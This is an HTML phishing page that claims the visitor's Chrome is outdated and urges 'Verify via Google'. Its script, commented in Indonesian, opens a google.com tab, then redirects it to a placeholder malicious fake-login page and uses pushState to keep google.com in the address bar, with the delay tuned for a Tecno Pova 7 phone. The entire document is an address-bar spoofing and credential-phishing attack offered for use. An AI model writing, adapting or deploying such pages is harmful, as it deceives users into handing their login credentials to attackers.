<!DOCTYPE html>
<html>
<head>
    <title>Update System</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #1a73e8; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <h2>Security Update Required</h2>
    <p>Your Chrome version is outdated. Please verify your account to continue.</p>
    <br>
    <button onclick="startSpoof()">Verify via Google</button>

    <script>
        function startSpoof() {
            // 1. Buka tab baru ke domain target (yang mau di-spoof)
            const victimTab = window.open("https://www.google.com", "_blank");

            // 2. Race condition: Tunggu sebentar pas browser lagi proses loading
            setTimeout(() => {
                if (victimTab) {
                    // 3. Tembak navigasi ke "Halaman Palsu" kita berkali-kali
                    // Tujuannya biar Address Bar nyangkut di google.com tapi kontennya lari ke kita
                    victimTab.location = "https://your-malicious-site.com/fake-login.html";
                    
                    // 4. Teknik tambahan: PushState buat nahan URL di bar
                    victimTab.history.pushState({}, "", "https://www.google.com/search?q=security-update");
                }
            }, 800); // Mainin angka ini (600ms - 1200ms) buat Tecno Pova 7 lo
        }
    </script>
</body>
</html>
